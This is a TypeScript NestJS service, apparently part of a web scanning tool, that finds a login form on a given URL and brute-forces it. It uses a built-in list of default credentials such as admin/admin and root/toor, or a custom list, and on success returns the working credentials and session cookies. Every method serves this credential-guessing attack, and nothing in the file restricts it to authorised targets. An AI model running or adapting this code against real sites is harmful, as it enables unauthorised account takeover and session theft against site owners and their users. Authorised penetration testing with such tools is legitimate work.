import { Injectable } from '@nestjs/common';
import { HttpService } from '../../http/http.service';
import { AuthCredentials, AuthResult, LoginForm } from './auth.types';

@Injectable()
export class AuthService {
  private wordlist: AuthCredentials[] = [
    { username: 'admin',    password: 'admin'     },
    { username: 'admin',    password: 'password'  },
    { username: 'admin',    password: '123456'    },
    { username: 'admin',    password: 'admin123'  },
    { username: 'root',     password: 'root'      },
    { username: 'root',     password: 'toor'      },
    { username: 'test',     password: 'test'      },
    { username: 'guest',    password: 'guest'     },
    { username: 'user',     password: 'user'      },
    { username: 'admin',    password: ''          },
  ];

  constructor(private readonly http: HttpService) {}

  async detectLoginForm(url: string): Promise<LoginForm | null> {
    try {
      const res = await this.http.get(url);
      return this.parseLoginForm(res.body, url);
    } catch {
      return null;
    }
  }

  async tryLogin(form: LoginForm, credentials: AuthCredentials): Promise<AuthResult> {
    try {
      const data: Record<string, string> = {
        [form.usernameField]: credentials.username,
        [form.passwordField]: credentials.password,
      };

      const res =
        form.method === 'POST'
          ? await this.http.post(form.action, data)
          : await this.http.get(
              `${form.action}?${new URLSearchParams(data).toString()}`,
            );

      const success = this.detectLoginSuccess(res.body, res.status);
      const cookies = this.parseCookies(res.headers['set-cookie'] ?? '');

      return {
        url: form.action,
        success,
        credentials: success ? credentials : undefined,
        cookies: success ? cookies : undefined,
      };
    } catch (error) {
      return {
        url: form.action,
        success: false,
        error: 'Falha ao tentar autenticação',
      };
    }
  }

  async bruteforce(
    url: string,
    customWordlist?: AuthCredentials[],
  ): Promise<AuthResult> {
    const form = await this.detectLoginForm(url);

    if (!form) {
      return {
        url,
        success: false,
        error: 'Formulário de login não encontrado',
      };
    }

    const list = customWordlist ?? this.wordlist;

    for (const credentials of list) {
      const result = await this.tryLogin(form, credentials);

      if (result.success) {
        return result;
      }

      await this.delay(300);
    }

    return {
      url,
      success: false,
      error: 'Nenhuma credencial válida encontrada',
    };
  }

  async testCredential(
    url: string,
    credentials: AuthCredentials,
  ): Promise<AuthResult> {
    const form = await this.detectLoginForm(url);

    if (!form) {
      return {
        url,
        success: false,
        error: 'Formulário de login não encontrado',
      };
    }

    return this.tryLogin(form, credentials);
  }

  private parseLoginForm(body: string, baseUrl: string): LoginForm | null {
    const formMatch = body.match(/<form[^>]*action=["']?([^"'\s>]*)["']?[^>]*method=["']?(\w+)["']?[^>]*>[\s\S]*?<\/form>/i);

    if (!formMatch) return null;

    const hasPasswordField = /<input[^>]*type=["']?password["']?/i.test(body);
    if (!hasPasswordField) return null;

    const action = formMatch[1]
      ? new URL(formMatch[1], baseUrl).toString()
      : baseUrl;

    const method = (formMatch[2]?.toUpperCase() ?? 'POST') as 'GET' | 'POST';

    const usernameField = this.extractFieldName(body, ['text', 'email']) ?? 'username';
    const passwordField = this.extractFieldName(body, ['password']) ?? 'password';

    return { action, method, usernameField, passwordField };
  }

  private extractFieldName(body: string, types: string[]): string | null {
    for (const type of types) {
      const match = body.match(
        new RegExp(`<input[^>]*type=["']?${type}["']?[^>]*name=["']?([^"'\\s>]+)["']?`, 'i'),
      );
      if (match?.[1]) return match[1];

      const matchReverse = body.match(
        new RegExp(`<input[^>]*name=["']?([^"'\\s>]+)["']?[^>]*type=["']?${type}["']?`, 'i'),
      );
      if (matchReverse?.[1]) return matchReverse[1];
    }
    return null;
  }

  private detectLoginSuccess(body: string, status: number): boolean {
    if (status === 302) return true; 

    const failureIndicators = [
      'invalid',
      'incorrect',
      'wrong',
      'failed',
      'error',
      'inválido',
      'incorreto',
      'senha errada',
      'usuário não encontrado',
    ];

    const lower = body.toLowerCase();
    return !failureIndicators.some(i => lower.includes(i));
  }

  private parseCookies(cookieHeader: string): Record<string, string> {
    const cookies: Record<string, string> = {};

    cookieHeader.split(',').forEach(part => {
      const [pair] = part.trim().split(';');
      const [key, value] = pair.split('=');
      if (key && value) cookies[key.trim()] = value.trim();
    });

    return cookies;
  }

  private delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}